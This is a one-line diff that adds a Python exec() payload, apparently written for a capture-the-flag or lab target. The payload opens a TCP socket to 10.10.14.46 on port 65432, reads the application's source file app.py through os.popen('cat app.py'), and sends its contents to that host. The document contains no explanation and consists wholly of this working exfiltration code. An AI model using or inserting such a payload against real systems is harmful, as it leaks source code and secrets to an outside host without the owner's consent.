@@ -1,0 +1,1 @@
+exec("import socket \nimport os \nh='10.10.14.46' \np=65432 \nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: \n  s.connect((h, p)) \n  s.sendall(bytes(str(os.popen('cat app.py').read()),'UTF-8'))")
